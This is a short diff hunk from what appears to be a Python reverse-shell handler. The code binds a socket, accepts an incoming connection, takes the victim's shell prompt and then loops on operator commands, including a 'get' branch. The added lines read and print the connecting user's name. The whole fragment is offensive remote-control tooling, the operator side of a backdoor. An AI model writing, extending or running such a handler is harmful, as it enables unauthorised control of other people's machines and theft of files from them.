@@ -48,6 +48,8 @@ s.bind(('', port))
 s.listen(1)
 c,addr = s.accept()
 shell = c.recv(1024).decode() + ">"
+user = c.recv(1024).decode()
+print("\n[+] Got Connection from ", user, "\n")
 while True:
     cmd = input(shell)
     if 'get' in cmd:
